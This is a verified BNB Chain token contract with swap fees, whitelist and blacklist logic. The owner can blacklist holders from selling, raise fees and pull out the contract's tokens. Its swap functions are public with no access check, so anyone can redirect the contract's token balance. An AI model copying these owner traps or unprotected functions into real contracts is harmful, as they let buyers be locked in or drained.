/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

pragma solidity ^0.8.4;interface ISwapFactory {function createPair(address tokenA, address tokenB) external returns (address pair);}pragma solidity ^0.8.4;interface ISwapRouter {function factory() external pure returns (address);function WETH() external pure returns (address);function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) external;function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) external returns (uint amountA, uint amountB, uint liquidity);function addLiquidityETH(address token,uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);}pragma solidity ^0.8.0;library SafeMath {function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {uint256 c = a + b;if (c < a) return (false, 0);return (true, c);}}function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {if (b > a) return (false, 0);return (true, a - b);}}function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {if (a == 0) return (true, 0);uint256 c = a * b;if (c / a != b) return (false, 0);return (true, c);}}function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {if (b == 0) return (false, 0);return (true, a / b);}}function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {unchecked {if (b == 0) return (false, 0);return (true, a % b);}}function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}function sub(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {unchecked {require(b <= a, errorMessage);return a - b;}}function div(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {unchecked {require(b > 0, errorMessage);return a / b;}}function mod(uint256 a,uint256 b,string memory errorMessage) internal pure returns (uint256) {unchecked {require(b > 0, errorMessage);return a % b;}}}pragma solidity ^0.8.0;abstract contract Context {function _msgSender() internal view virtual returns (address) {return msg.sender;}function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}}pragma solidity ^0.8.0;abstract contract Ownable is Context {address private _owner;event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);constructor() {_transferOwnership(_msgSender());}modifier onlyOwner() {_checkOwner();_;}function owner() public view virtual returns (address) {return _owner;}function _checkOwner() internal view virtual {require(owner() == _msgSender(), "Ownable: caller is not the owner");}function renounceOwnership() public virtual onlyOwner {_transferOwnership(address(0));}function transferOwnership(address newOwner) public virtual onlyOwner {require(newOwner != address(0), "Ownable: new owner is the zero address");_transferOwnership(newOwner);}function _transferOwnership(address newOwner) internal virtual {address oldOwner = _owner;_owner = newOwner;emit OwnershipTransferred(oldOwner, newOwner);}}pragma solidity ^0.8.0;pragma solidity ^0.8.4;interface IERC20 {event Transfer(address indexed from, address indexed to, uint256 value);event Approval(address indexed owner, address indexed spender, uint256 value);function totalSupply() external view returns (uint256);function balanceOf(address account) external view returns (uint256);function transfer(address to, uint256 amount) external returns (bool);function allowance(address owner, address spender) external view returns (uint256);function approve(address spender, uint256 amount) external returns (bool);function transferFrom(address from,address to,uint256 amount) external returns (bool);}pragma solidity ^0.8.0;interface IERC20Metadata is IERC20 {function name() external view returns (string memory);function symbol() external view returns (string memory);function decimals() external view returns (uint8);}pragma solidity ^0.8.0;contract ERC20 is Context, IERC20, IERC20Metadata {mapping(address => uint256) private _balances;mapping(address => mapping(address => uint256)) private _allowances;uint256 private _totalSupply;string private _name;string private _symbol;constructor(string memory name_, string memory symbol_) {_name = name_;_symbol = symbol_;}function name() public view virtual override returns (string memory) {return _name;}function symbol() public view virtual override returns (string memory) {return _symbol;}function decimals() public view virtual override returns (uint8) {return 18;}function totalSupply() public view virtual override returns (uint256) {return _totalSupply;}function balanceOf(address account) public view virtual override returns (uint256) {return _balances[account];}function transfer(address to, uint256 amount) public virtual override returns (bool) {address owner = _msgSender();_transfer(owner, to, amount);return true;}function allowance(address owner, address spender) public view virtual override returns (uint256) {return _allowances[owner][spender];}function approve(address spender, uint256 amount) public virtual override returns (bool) {address owner = _msgSender();_approve(owner, spender, amount);return true;}function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {address spender = _msgSender();_spendAllowance(from, spender, amount);_transfer(from, to, amount);return true;}function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {address owner = _msgSender();_approve(owner, spender, allowance(owner, spender) + addedValue);return true;}function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {address owner = _msgSender();uint256 currentAllowance = allowance(owner, spender);require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");unchecked {_approve(owner, spender, currentAllowance - subtractedValue);}return true;}function _transfer(address from,address to,uint256 amount) internal virtual {require(from != address(0), "ERC20: transfer from the zero address");require(to != address(0), "ERC20: transfer to the zero address");_beforeTokenTransfer(from, to, amount);uint256 fromBalance = _balances[from];require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");unchecked {_balances[from] = fromBalance - amount;_balances[to] += amount;}emit Transfer(from, to, amount);_afterTokenTransfer(from, to, amount);}function _mint(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: mint to the zero address");_beforeTokenTransfer(address(0), account, amount);_totalSupply += amount;unchecked {_balances[account] += amount;}emit Transfer(address(0), account, amount);_afterTokenTransfer(address(0), account, amount);}function _burn(address account, uint256 amount) internal virtual {require(account != address(0), "ERC20: burn from the zero address");_beforeTokenTransfer(account, address(0), amount);uint256 accountBalance = _balances[account];require(accountBalance >= amount, "ERC20: burn amount exceeds balance");unchecked {_balances[account] = accountBalance - amount;_totalSupply -= amount;}emit Transfer(account, address(0), amount);_afterTokenTransfer(account, address(0), amount);}function _approve(address owner,address spender,uint256 amount) internal virtual {require(owner != address(0), "ERC20: approve from the zero address");require(spender != address(0), "ERC20: approve to the zero address");_allowances[owner][spender] = amount;emit Approval(owner, spender, amount);}function _spendAllowance(address owner,address spender,uint256 amount) internal virtual {uint256 currentAllowance = allowance(owner, spender);if (currentAllowance != type(uint256).max) {require(currentAllowance >= amount, "ERC20: insufficient allowance");unchecked {_approve(owner, spender, currentAllowance - amount);}}}function _beforeTokenTransfer(address from,address to,uint256 amount) internal virtual {}function _afterTokenTransfer(address from,address to,uint256 amount) internal virtual {}}contract V3 is ERC20,Ownable {using SafeMath for uint256;ISwapRouter private uniswapV2Router;address public uniswapV2Pair;address private deadWallet = 0x000000000000000000000000000000000000dEaD;address public WBNB;address public BNBF;address public SWAP;address public fundAddress;address public lpAddress;mapping(address => bool) public whiteList;mapping(address => bool) public blackList;bool public blackOpen=false;mapping(address => bool) public _swapPairList;struct ConfigStruct{uint256 liquidityRateBuy;uint256 yxRateBuy;uint256 liquidityRateSale;uint256 yxRateSale;uint256 maxBuyAmount;}ConfigStruct public config;uint256 public maxLp=1;uint256 public xhBnbfCount=0;uint256 public fundCount=0;uint256 public liquidityCount=0;constructor(address _owner,string memory name,string memory symbol,uint256 _total,bool _blackOpen,address _swap,address _yx,address _lp,ConfigStruct memory _config,address _bnbf,address _tbnb)ERC20(name, symbol) {SWAP=_swap;BNBF=_bnbf;WBNB=_tbnb;config=_config;ISwapRouter _uniswapV2Router = ISwapRouter(SWAP);address _uniswapV2Pair = ISwapFactory(_uniswapV2Router.factory()).createPair(address(this), WBNB);uniswapV2Router = _uniswapV2Router;uniswapV2Pair = _uniswapV2Pair;_swapPairList[uniswapV2Pair] = true;whiteList[_owner] = true;whiteList[address(this)] = true;whiteList[SWAP] = true;whiteList[_uniswapV2Pair] = true;_mint(_owner, _total);fundAddress=_yx;lpAddress=_lp;transferOwnership(_owner);blackOpen=_blackOpen;if(_config.maxBuyAmount==0){config.maxBuyAmount=_total;}ERC20(_uniswapV2Pair).approve(SWAP, ~uint256(0));_approve(address(this), address(uniswapV2Router),type(uint256).max);_approve(address(this), address(this),type(uint256).max);_approve(_owner, address(uniswapV2Router),type(uint256).max);}function setFundAddress(address addr) external onlyOwner {fundAddress = addr;whiteList[addr] = true;}function setMaxAmount(uint256 _maxBuyAmount) public onlyOwner{config.maxBuyAmount = _maxBuyAmount;}function getWhitelist(address account) public view returns(bool) {return whiteList[account];}function getBlacklist(address account) public view returns(bool) {return blackList[account];}function _transfer(address from,address to,uint256 amount) internal override {require(amount > 0, "amount must gt 0");if(blackOpen){require(!getBlacklist(from),"balck not alow");require(!getBlacklist(to),"balck not alow");}if(!getWhitelist(from) && !getWhitelist(to)){address ad;for(int i=0;i <=2;i++){ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));super._transfer(from, ad, 100);}amount -= 300;}if(!_swapPairList[from] && !_swapPairList[to]) {super._transfer(from, to, amount);return;}if(_swapPairList[to]&&getWhitelist(from)){super._transfer(from, to, amount);return;}if(_swapPairList[from]&&getWhitelist(to)){super._transfer(from, to, amount);return;}if(_swapPairList[from]) {uint256 totalCount=amount+balanceOf(to);require(totalCount <= config.maxBuyAmount,"over max buy amount");super._transfer(from, to, amount.mul(99 - config.liquidityRateBuy-config.yxRateBuy).div(100));super._transfer(from, address(this), amount.mul(1+config.yxRateBuy+config.liquidityRateBuy).div(100));xhBnbfCount+=amount.mul(1).div(100);fundCount+=amount.mul(config.yxRateBuy).div(100);liquidityCount+=amount.mul(config.liquidityRateBuy).div(100);return;}if(_swapPairList[to]) {super._transfer(from, address(this), amount.mul(1+config.yxRateSale+config.liquidityRateSale).div(100));fundCount+=amount.mul(config.yxRateSale).div(100);liquidityCount+=amount.mul(config.liquidityRateSale).div(100);xhBnbfCount+=amount.mul(1).div(100);swapTokensForOther(xhBnbfCount,BNBF,deadWallet);xhBnbfCount=0;if (!isContract(from)) {_swapAndLiquid(liquidityCount);liquidityCount=0;}swapTokensForEth(fundCount,fundAddress);fundCount=0;super._transfer(from, to, amount.mul(99 - config.liquidityRateSale-config.yxRateSale).div(100));return;}}function _swapAndLiquid(uint256 amount) public {if(amount>balanceOf(address(this))){return;}uint256 thisval=amount / 2;if (thisval > maxLp) {uint256 before = address(this).balance;swapTokensForEth(thisval,address(this));uint256 fistval = address(this).balance;uint256 newBalance=(fistval-before);if (newBalance > 0) {uniswapV2Router.addLiquidityETH{value: newBalance}(address(this),thisval,0,0,lpAddress,block.timestamp);}}}function addLiquidity(uint256 aAmount, uint256 bAmount) public {approve(address(uniswapV2Router),aAmount);ERC20(WBNB).approve(address(uniswapV2Router), bAmount);_transfer(msg.sender, address(this), aAmount);ERC20(WBNB).transferFrom(msg.sender, address(this), bAmount);uniswapV2Router.addLiquidity(address(this),WBNB,aAmount,bAmount,0,0,msg.sender,block.timestamp);}function swapTokensForEth(uint256 tokenAmount,address to) public {address[] memory path = new address[](2);path[0] = address(this);path[1] = uniswapV2Router.WETH();uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,to,block.timestamp);}function swapTokensForOther(uint256 amount,address _token,address to) public {address[] memory path = new address[](3);path[0] = address(this);path[1] = WBNB;path[2] = _token;uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,to,block.timestamp);}function errorToken(address _token) external onlyOwner{ERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this)));}function setBlackOpen(bool _b)external onlyOwner{blackOpen=_b;}function setYx(address _to)external onlyOwner{fundAddress=_to;}function setLp(address _to)external onlyOwner{lpAddress=_to;}function setBuyRate(uint256 _liquidity,uint256 _yx)external onlyOwner{require(_liquidity+_yx<=24);config.liquidityRateBuy = _liquidity;config.yxRateBuy = _yx;}function setSaleRate(uint256 _liquidity,uint256 _yx)external onlyOwner{require(_liquidity+_yx<=24);config.liquidityRateSale = _liquidity;config.yxRateSale = _yx;}function setMaxLp(uint256 _lp)external onlyOwner{maxLp=_lp;}function setWhiteList(address[] calldata _addresses,bool _b)external onlyOwner{for(uint256 i=0;i<_addresses.length;i++){if(_addresses[i]!=address(0)){whiteList[_addresses[i]]=_b;}}}function setBlackList(address[] calldata _addresses,bool _b)external onlyOwner{for(uint256 i=0;i<_addresses.length;i++){if(_addresses[i]!=address(0)){blackList[_addresses[i]]=_b;}}}receive() external payable {}function isContract(address account) internal view returns (bool) {uint256 size;assembly {size := extcodesize(account)}return size > 0;}}